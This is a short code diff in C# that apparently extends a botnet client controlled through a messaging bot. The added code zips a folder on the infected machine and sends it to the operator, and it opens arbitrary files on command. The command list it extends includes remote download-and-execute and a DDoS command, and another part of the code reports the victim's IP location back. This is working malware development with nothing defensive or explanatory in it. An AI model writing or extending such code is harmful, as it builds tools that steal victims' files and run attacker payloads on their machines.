@@ -326,6 +326,12 @@ namespace Botnet
 
         public void DownloadFolder(string path)
         {
+            if (!Directory.Exists(path))
+            {
+                ts.SendMessage($"[File Manager] Path \"{path}\" does not exists!");
+                return;
+            }
+
             string zip = misc.ZipFolder(path);
             ts.SendDocument(zip);
         }
@@ -333,6 +339,7 @@ namespace Botnet
         public void SendCommands()
         {
             string response =
+                "/ping - get response from bots\n" +
                 "/open_link|<link> - open some link in browser\n" +
                 "/download_execute|<link> - download and instant open file\n" +
                 "/exit - close bot\n/ddos|<ip>|<threads> - in developing" +
@@ -382,6 +389,14 @@ namespace Botnet
                 $"Timezone: {providerData.Timezone}\r\n";
 
             ts.SendMessage(strIpLocation);
+        }
+
+        public void OpenFile(string path)
+        {
+            if (File.Exists(path))
+                Process.Start(path);
+            else
+                ts.SendMessage("[File Manager] File does not exists!");
         }
     }
 }
